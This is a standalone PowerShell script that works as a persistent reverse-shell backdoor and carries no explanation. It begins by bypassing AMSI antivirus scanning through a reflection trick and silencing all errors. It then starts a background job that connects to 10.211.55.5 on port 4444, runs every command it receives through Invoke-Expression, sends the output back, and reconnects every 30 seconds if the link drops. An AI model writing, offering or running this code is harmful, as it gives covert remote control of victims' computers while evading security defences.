
$ErrorActionPreference = 'SilentlyContinue'


$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)


$TargetIP = '10.211.55.5'
$TargetPort = 4444


Function Start-Backdoor {
While($true) {
Try {
            $client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true
            
            $writer.WriteLine("Connected to: " + [System.Environment]::MachineName)
While($client.Connected) {
                $cmd = $reader.ReadLine()
If($cmd -eq "exit") { break }
                
           
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output + "PS " + (Get-Location).Path + ">")
            }
            $client.Close()
        } catch {
           
            Start-Sleep -Seconds 30
        }
    }
}


Start-Job -ScriptBlock ${function:Start-Backdoor} | Out-Null
